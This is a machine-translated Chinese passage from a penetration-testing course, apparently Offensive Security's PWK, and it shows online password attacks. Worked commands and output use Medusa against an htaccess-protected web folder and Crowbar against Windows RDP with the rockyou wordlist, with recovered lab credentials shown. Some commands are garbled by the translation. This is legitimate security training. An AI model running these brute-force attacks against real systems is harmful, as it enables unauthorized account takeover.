<div style="position:absolute;top:163295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/wordlists/rockyou.txt.gz，我们必须先用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gunzip</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解压</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:163330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo gunzip /usr/share/wordlists/rockyou.txt.gz</font></font></font></b></nobr></div>
<div style="position:absolute;top:163346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:163366;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 601 - 解压 Rockyou 词表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:163395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将启动美</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杜莎</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并发起针对 htaccess 保护的 URL（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-m</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:163415;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DIR:/admin </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) 在我们的目标主机上使用</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-h 10.11.0.22 </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们将攻击 admin 用户 ( </font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-u admin </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">)</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:163434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用我们的rockyou wordlist文件中的密码（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-P /usr/share/wordlists/rockyou.txt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:163454;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当然，将使用 HTTP 身份验证方案 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-M</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:163488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:163505;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-m 目录：/管理员</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:163522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;</font></font></nobr></div>
<div style="position:absolute;top:163556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户检查：[http] 主机：10.11.0.22 用户：admin 密码：123456 (1 of 14344391 com</font></font></nobr></div>
<div style="position:absolute;top:163573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户检查：[http] 主机：10.11.0.22 用户：admin 密码：12345 (2 of 14344391 comp</font></font></nobr></div>
<div style="position:absolute;top:163590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户检查：[http] 主机：10.11.0.22 用户：admin 密码：123456789（14344391 中的 3 个） </font></font></nobr></div>
<div style="position:absolute;top:163607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户检查：[http] 主机：10.11.0.22 用户：admin 密码：password (4 of 14344391 c</font></font></nobr></div>
<div style="position:absolute;top:163624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户检查：[http] 主机：10.11.0.22 用户：admin 密码：iloveyou (5 of 14344391 c</font></font></nobr></div>
<div style="position:absolute;top:163641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:163658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户检查：[http] 主机：10.11.0.22 用户：admin 密码：samsung (255 of 14344391 </font></font></nobr></div>
<div style="position:absolute;top:163675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户检查：[http] 主机：10.11.0.22 用户：admin 密码：freedom (256 of 14344391 </font></font></nobr></div>
<div style="position:absolute;top:163692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到帐户：[http] 主机：10.11.0.22</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户：admin 密码：freedom [成功]</font></font></font></b></nobr></div>
<div style="position:absolute;top:163709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:163728;left:316"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 602 - 使用 Medusa 的 HTTP htaccess 攻击</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:163758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，美杜莎发现了一个有效的密码“自由”。</font></font></nobr></div>
<div style="position:absolute;top:163791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Medusa 有许多附加选项和设置，如清单 603 中的帮助输出所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:163825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$美</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杜莎</font></font></font></b></nobr></div>
<div style="position:absolute;top:163843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;</font></font></nobr></div>
<div style="position:absolute;top:163876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告：必须提供主机信息。</font></font></nobr></div>
<div style="position:absolute;top:163910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语法：Medusa [-h 主机|-H 文件] [-u 用户名|-U 文件] [-p 密码|-P 文件] [-C 文件]</font></font></nobr></div>
<div style="position:absolute;top:163927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-M 模块 [OPT]</font></font></nobr></div>
<div style="position:absolute;top:163944;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-h [TEXT] : 目标主机名或 IP 地址</font></font></nobr></div>
<div style="position:absolute;top:163961;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-H [FILE] : 包含目标主机名或 IP 地址的文件</font></font></nobr></div>
<div style="position:absolute;top:163978;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-u [TEXT] : 要测试的用户名 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:164119;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="139"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 139 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:164152;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:165229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:165229;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:165229;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">580</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:164248;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-U [FILE] : 包含要测试的用户名的文件</font></font></nobr></div>
<div style="position:absolute;top:164264;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p [TEXT] : 测试密码</font></font></nobr></div>
<div style="position:absolute;top:164281;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-P [FILE] : 包含要测试的密码的文件</font></font></nobr></div>
<div style="position:absolute;top:164298;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-C [FILE] ：包含组合条目的文件。</font><font style="vertical-align: inherit;">有关更多信息，请参阅自述文件。</font></font></nobr></div>
<div style="position:absolute;top:164316;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-O [FILE] : 将日志信息附加到的文件</font></font></nobr></div>
<div style="position:absolute;top:164332;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e [n/s/ns] ：附加密码检查（[n] 无密码，[s] 密码 = 用户名）</font></font></nobr></div>
<div style="position:absolute;top:164349;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-M [TEXT] ：要执行的模块的名称（不带 .mod 扩展名）</font></font></nobr></div>
<div style="position:absolute;top:164366;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-m [TEXT] : 传递给模块的参数。</font><font style="vertical-align: inherit;">这可以通过多次wi</font></font></nobr></div>
<div style="position:absolute;top:164383;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每次不同的参数，它们都会被发送到模块</font></font></nobr></div>
<div style="position:absolute;top:164400;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-m 参数 1 -m 参数 2 等）</font></font></nobr></div>
<div style="position:absolute;top:164417;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d    </font></font></nobr></div>
<div style="position:absolute;top:164417;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 转储所有已知模块</font></font></nobr></div>
<div style="position:absolute;top:164434;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n [NUM] : 用于非默认 TCP 端口号</font></font></nobr></div>
<div style="position:absolute;top:164451;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s    </font></font></nobr></div>
<div style="position:absolute;top:164451;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 启用 SSL</font></font></nobr></div>
<div style="position:absolute;top:164468;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-g [NUM] : 尝试连接 NUM 秒后放弃（默认 3）</font></font></nobr></div>
<div style="position:absolute;top:164485;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-r [NUM] : 在重试尝试之间休眠 NUM 秒（默认为 3）</font></font></nobr></div>
<div style="position:absolute;top:164502;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-R [NUM] : 在放弃之前尝试 NUM 重试。</font><font style="vertical-align: inherit;">总尝试次数</font></font></nobr></div>
<div style="position:absolute;top:164519;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-c [NUM] : 在 usec 中等待验证套接字可用的时间（默认 500 usec）</font></font></nobr></div>
<div style="position:absolute;top:164536;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-t [NUM] ：同时测试的登录总数</font></font></nobr></div>
<div style="position:absolute;top:164553;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-T [NUM] ：要同时测试的主机总数</font></font></nobr></div>
<div style="position:absolute;top:164570;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-L    </font></font></nobr></div>
<div style="position:absolute;top:164570;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：每个线程使用一个用户名并行化登录。</font><font style="vertical-align: inherit;">默认为 p</font></font></nobr></div>
<div style="position:absolute;top:164587;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续之前的整个用户名。</font></font></nobr></div>
<div style="position:absolute;top:164604;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-F    </font></font></nobr></div>
<div style="position:absolute;top:164604;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 找到第一个有效的用户名/密码后停止扫描主机。</font></font></nobr></div>
<div style="position:absolute;top:164621;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-F    </font></font></nobr></div>
<div style="position:absolute;top:164621;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：在任何主机上找到第一个有效的用户名/密码后停止审计。</font></font></nobr></div>
<div style="position:absolute;top:164638;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-b    </font></font></nobr></div>
<div style="position:absolute;top:164638;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 禁止启动横幅</font></font></nobr></div>
<div style="position:absolute;top:164655;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-q    </font></font></nobr></div>
<div style="position:absolute;top:164655;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 显示模块的使用信息</font></font></nobr></div>
<div style="position:absolute;top:164672;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-v [NUM] ：详细级别 [0 - 6（更多）]</font></font></nobr></div>
<div style="position:absolute;top:164689;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-w [NUM] : 错误调试级别 [0 - 10 (more)]</font></font></nobr></div>
<div style="position:absolute;top:164706;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-V    </font></font></nobr></div>
<div style="position:absolute;top:164706;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 显示版本</font></font></nobr></div>
<div style="position:absolute;top:164723;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-Z [TEXT] : 根据上次扫描的地图恢复扫描</font></font></nobr></div>
<div style="position:absolute;top:164742;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 603 - 美杜莎选项和模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:164771;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个工具可以和多种网络协议交互，可以用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">显示</font></font></nobr></div>
<div style="position:absolute;top:164791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如下面的清单 604 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:164826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ 美</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杜莎 -d</font></font></font></b></nobr></div>
<div style="position:absolute;top:164843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;</font></font></nobr></div>
<div style="position:absolute;top:164877;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“.”中的可用模块 </font><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:164911;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“/usr/lib/medusa/modules”中的可用模块：</font></font></nobr></div>
<div style="position:absolute;top:164928;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ cvs.mod：CVS 会话的蛮力模块：2.0 版</font></font></nobr></div>
<div style="position:absolute;top:164944;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ ftp.mod：FTP/FTPS 会话的暴力破解模块：2.1 版</font></font></nobr></div>
<div style="position:absolute;top:164961;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http.mod：HTTP 暴力破解模块：2.1 版</font></font></nobr></div>
<div style="position:absolute;top:164978;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ imap.mod：IMAP 会话的蛮力模块：2.0 版</font></font></nobr></div>
<div style="position:absolute;top:164995;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ mssql.mod：M$-SQL 会话的蛮力模块：2.0 版</font></font></nobr></div>
<div style="position:absolute;top:165013;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ mysql.mod：MySQL 会话的蛮力模块：2.0 版</font></font></nobr></div>
<div style="position:absolute;top:165029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:165049;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 604 - 美杜莎选项和模块</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:165079;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:165114;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（这些练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:165147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 对 htaccess 保护的文件夹重复密码攻击。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:165307;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="140"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 140 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:165340;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:166417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:166417;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:166417;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">581</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:165436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 创建一个包含您的 Windows 客户端密码的密码列表，并使用它来执行</font></font></nobr></div>
<div style="position:absolute;top:165455;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码再次攻击 Windows 客户端上的 SMB 协议。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:165489;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3.2</font></font></i></nobr></div>
<div style="position:absolute;top:165489;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Crowbar 进行远程桌面协议攻击</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:165528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Crowbar，正式名称为 Levye，是一种网络认证破解工具，主要用于</font></font></nobr></div>
<div style="position:absolute;top:165547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用 SSH 密钥而不是密码。</font><font style="vertical-align: inherit;">它也是为数不多的能够可靠且</font></font></nobr></div>
<div style="position:absolute;top:165566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效地对 Windows 远程桌面协议 (RDP) 服务执行密码攻击</font></font></nobr></div>
<div style="position:absolute;top:165586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在现代版本的 Windows 上。</font><font style="vertical-align: inherit;">让我们在我们的 Windows 客户端机器上试试这个工具。</font></font></nobr></div>
<div style="position:absolute;top:165618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先让我们从 Kali 存储库安装 Crowbar：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:165653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt install crowbar</font></font></font></b></nobr></div>
<div style="position:absolute;top:165670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阅读包裹清单...完成</font></font></nobr></div>
<div style="position:absolute;top:165687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构建依赖树    </font></font></nobr></div>
<div style="position:absolute;top:165704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">读取状态信息...完成</font></font></nobr></div>
<div style="position:absolute;top:165721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:165741;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 605 - 使用 apt install 安装 Crowbar</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:165770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要调用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">crowbar</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们将指定协议 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-b</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )、目标服务器 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )、用户名 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-u</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )、</font></font></nobr></div>
<div style="position:absolute;top:165789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wordlist ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-C</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 和线程数 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，如清单 606 所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:165824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1</font></font></font></b></nobr></div>
<div style="position:absolute;top:165841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019-08-16 04:51:12 开始</font></font></nobr></div>
<div style="position:absolute;top:165858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019-08-16 04:51:12 Crowbar v0.3.5-dev</font></font></nobr></div>
<div style="position:absolute;top:165875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019-08-16 04:51:12 尝试 10.11.0.22:3389</font></font></nobr></div>
<div style="position:absolute;top:165892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019-08-16 04:51:13 RDP-</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功：10.11.0.22:3389 - admin:Offsec！</font></font></font></b></nobr></div>
<div style="position:absolute;top:165909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019-08-16 04:51:13 停止</font></font></nobr></div>
<div style="position:absolute;top:165928;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 606 - 使用 Crowbar 的 RDP 密码攻击</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:165958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，Crowbar 发现了“admin”用户的工作凭据。</font><font style="vertical-align: inherit;">我们指定了一个</font></font></nobr></div>
<div style="position:absolute;top:165977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">线程，因为远程桌面协议不能可靠地处理多线程。</font></font></nobr></div>
<div style="position:absolute;top:166010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要查看其他支持的协议，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--help</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">运行 crowbar </font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:166045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">crowbar --help</font></font></font></b></nobr></div>
<div style="position:absolute;top:166062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：用法：使用 --help 获取更多信息</font></font></nobr></div>
<div style="position:absolute;top:166096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Crowbar 是一个蛮力工具，它支持 OpenVPN、远程桌面协议、</font></font></nobr></div>
<div style="position:absolute;top:166113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 私钥和 VNC 密钥。</font></font></nobr></div>
<div style="position:absolute;top:166147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">位置参数：</font></font></nobr></div>
<div style="position:absolute;top:166164;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font></font></nobr></div>
<div style="position:absolute;top:166198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可选参数：</font></font></nobr></div>
<div style="position:absolute;top:166215;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-h, --help    </font></font></nobr></div>
<div style="position:absolute;top:166215;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示此帮助信息并退出</font></font></nobr></div>
<div style="position:absolute;top:166231;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-b {vnckey,sshkey,rdp,openvpn}, --brute {vnckey,sshkey,rdp,openvpn}</font></font></nobr></div>
<div style="position:absolute;top:166248;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标服务</font></font></nobr></div>
<div style="position:absolute;top:166266;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s 服务器，--server 服务器</font></font></nobr></div>
